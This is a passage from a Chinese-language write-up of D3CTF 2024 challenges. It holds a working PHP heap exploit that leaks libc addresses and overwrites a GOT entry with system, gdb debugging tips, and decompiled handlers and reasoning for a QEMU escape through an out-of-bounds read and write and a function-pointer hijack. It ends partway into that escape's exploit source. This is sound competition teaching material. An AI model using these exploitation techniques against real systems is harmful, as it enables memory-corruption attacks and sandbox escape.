class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2Hex</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>;<span class="variable">$i</span> &gt;= <span class="number">0</span>;<span class="variable">$i</span>--) <span class="variable">$hex</span>.= <span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]));</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$hex</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hex</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">int2Str</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$x</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;C&#x27;</span>, <span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4c490</span>;</span><br><span class="line"><span class="variable">$efree_got</span> = <span class="number">0x4038</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;a&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>, <span class="number">0x3f</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">0xe</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="number">0x61</span> + <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$aa</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>, <span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$aa</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$aaa</span>, <span class="variable">$b</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>,<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">7</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;c&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">8</span>, <span class="title function_ invoke__">int2str</span>(<span class="variable">$mod_base</span>+<span class="variable">$efree_got</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">int2str</span>(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>这道题我感觉难点在于如何调试。这道题目给出了 <code>docker</code> 环境，所以我们可以在 <code>docker</code> 中启动 <code>gdbserver</code> 远程调试，其做法如下：  </p><img src="/2024/04/29/d3ctf2024/1.png" class="" title="我的图图呢">  <p>然后在另外一个终端中启动 <code>gdb</code>，然后输入 <code>target remote:8888</code> 即可连接<br>这里要注意的是，我 <code>docker</code> 是将其 <code>9999</code> 端口映射到物理机的 <code>8888</code> 端口，所以我在 <code>docker</code> 中启动 <code>gdbserver</code> 使用的是 <code>9999</code> 端口，在物理机中 <code>gdb</code> 远程连接的端口是 <code>8888</code><br>由于题目给的 <code>docker</code> 并没有安装 <code>gdbserver</code>，我们可以通过下面这条命令进行安装  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdbserver</span><br></pre></td></tr></table></figure><p>接下来就要说说调试技巧。由于程序要运行很多汇编代码后才会将 <code>vuln.so</code> 模块给加载进来，所以一直在 <code>gdb</code> 中使用 <code>si</code> 是行不通的，我的方法是在 <code>exp.php</code> 中使用 <code>fgetc(STDIN)</code> 来将程序卡住，然后在 <code>gdb</code> 中输入 <code>c</code> 来进行类似于断点的操作，但是这样的 <code>php</code> 文件运行时会发现系统报错说找不到 <code>fgetc</code> 这一个 <code>function</code>，这是应为在 <code>php.ini</code> 文件中将这一个函数给 <code>ban</code> 了，我们可以通过下面这一条指令来找到 <code>php.ini</code> 文件所在的文件夹  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep <span class="string">&quot;Configuration File (php.ini) Path&quot;</span></span><br></pre></td></tr></table></figure><p>在 <code>php.ini</code> 文件中我们找到 <code>disable_functions</code> 那个地方  </p><img src="/2024/04/29/d3ctf2024/2.png" class="" title="我的图图呢">  <p>可以看见我们要用的 <code>fgetc</code> 函数在最后一行，我们将其删除即可<br>下面给出一条用于查询 <code>php</code> 扩展模块所在的路径的命令  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-config --extension-dir</span><br></pre></td></tr></table></figure><h1 id="D3EasyEscape"><a href="#D3EasyEscape" class="headerlink" title="D3EasyEscape"></a>D3EasyEscape</h1><p>这道题是 <code>qemu</code> 逃逸，之前没事干学了一下，这不刚好可以用上了，其关键函数如下：<br>l0dev_mmio_read：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">82LL</span>, <span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v6 + <span class="number">0xA00</span>) + addr) + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_read：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_pmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">104LL</span>, <span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++dword_123B1CC;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_mmio_write：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_n; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> addr_v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = opaque;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = value;</span><br><span class="line">  size_n = size;</span><br><span class="line">  v8 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">133LL</span>, <span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)addr;</span><br><span class="line">  addr_v7 = addr;</span><br><span class="line">  <span class="keyword">if</span> ( size_n &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v9 + size_n);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr_v7 == <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">void</span> *)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">void</span> *)v8;</span><br><span class="line">          *(_DWORD *)(v8 + <span class="number">0xA00</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_write：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_pmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  addr_v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = value;</span><br><span class="line">  n[<span class="number">0</span>] = size;</span><br><span class="line">  v9 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">173LL</span>, <span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_123B1CC )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v9 + <span class="number">0xA00</span>) + addr_v6) + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(addr_v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  addr_v10 = addr_v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * addr_v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = addr_v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr_v6 + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说实话，这道题目我看了好久才找到漏洞，还是做题做太少了。在 <code>l0dev_mmio_write</code> 函数中当 <code>addr_v7 == 0x80</code> 时我们可以对 <code>*(_DWORD *)(v8 + 0xA00)</code> 的值进行设置，而在 <code>l0dev_mmio_read</code> 函数中我们可以相对 <code>*(_DWORD *)(v8 + 0xA00)</code> 某个偏移范围内的数据进行读，在 <code>l0dev_pmio_write</code> 函数中我们可以相对 <code>*(_DWORD *)(v8 + 0xA00)</code> 某个偏移范围内的数据进行写，也就是说这里存在越界读和越界写。观察到 <code>l0dev_mmio_write</code> 函数中下面这一段代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )&#123;</span><br><span class="line">    v10 = n_4[<span class="number">0</span>];</span><br><span class="line">    addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见 <code>(int (__fastcall **)(_QWORD *))(v8 + 0xD48)</code> 处存储的是一个函数指针，通过 <code>gdb</code> 我们可以发现其存储的是 <code>rand_r</code> 函数的地址，该函数位于 <code>libc</code> 上，所以我们可以通过越界读读取此处来获取 <code>libc</code> 的地址。可以看见这个地方是通过函数指针调用了函数，且函数的参数我们是可控的，所以我们可以劫持该函数指针执行 <code>system</code> 函数的地址，然后另函数从参数为 <code>sh</code> 即可实现逃逸<br>exp：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span 